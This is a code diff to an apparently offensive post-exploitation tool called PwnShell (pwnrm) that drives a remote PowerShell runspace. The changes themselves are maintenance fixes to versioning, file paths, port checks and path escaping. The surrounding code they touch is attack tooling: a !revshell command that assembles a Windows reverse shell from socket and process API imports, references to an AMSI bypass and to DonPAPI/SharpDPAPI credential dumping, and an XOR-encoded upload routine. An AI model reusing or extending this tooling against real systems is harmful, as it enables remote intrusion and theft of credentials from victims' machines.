@@ -48,7 +48,8 @@ from .commands import (
 # ── PwnShell ──────────────────────────────────────────────────────────────────
 class PwnShell:
 
-    VERSION = "1.0.1"
+    from .. import __version__ as _pkg_version
+    VERSION = _pkg_version
 
     def __init__(self, runspace, target_info: dict | None = None):
         self.runspace    = runspace
@@ -60,7 +61,7 @@ class PwnShell:
         self.cmd_count   = 0
 
         if _PTK:
-            self.prompt_history = FileHistory(".pwnrm_history")
+            self.prompt_history = FileHistory(str(_PWNRM_DIR / ".pwnrm_history"))
             self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)
 
     def __del__(self):
@@ -69,7 +70,7 @@ class PwnShell:
     # ── logging ───────────────────────────────────────────────────────────────
     def start_log(self):
         if not self.stdout_log:
-            fn = f"pwnrm_{int(time.time())}_stdout.log"
+            fn = str(_PWNRM_DIR / f"pwnrm_{int(time.time())}_stdout.log")
             self.write_info(f"Logging to {c(C, fn)}")
             self.stdout_log = open(fn, "wb")
 
@@ -388,8 +389,10 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
         try:
             ip   = ip_address(args[0]).packed
             port = int(args[1])
+            if not (1 <= port <= 65535):
+                self.write_warning("Port must be between 1 and 65535"); return
             p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
-        except:
+        except (ValueError, IndexError):
             self.write_warning("usage: !revshell IP PORT"); return
         cmds = [
             _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
@@ -431,8 +434,9 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
                 self.write_warning("Upload interrupted"); self.run_sync(f"Remove-Item -Force '{tmpfn}'"); return
             self.write_progress(f"Upload {total}/{len(buf)} bytes")
         self.write_info(f"  [~] Moving to {c(C,str(dst))}")
-        self.run_with_interrupt(f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'", self.write_line)
-        h = self.run_sync(f"(Get-FileHash '{dst}' -Algorithm MD5).Hash")
+        dst_ps = self._pse(dst)
+        self.run_with_interrupt(f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst_ps}'", self.write_line)
+        h = self.run_sync(f"(Get-FileHash '{dst_ps}' -Algorithm MD5).Hash")
         ok = MD5.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
         if h.strip() != ok:
             self.write_error("  Upload integrity check FAILED — file may be corrupted!")
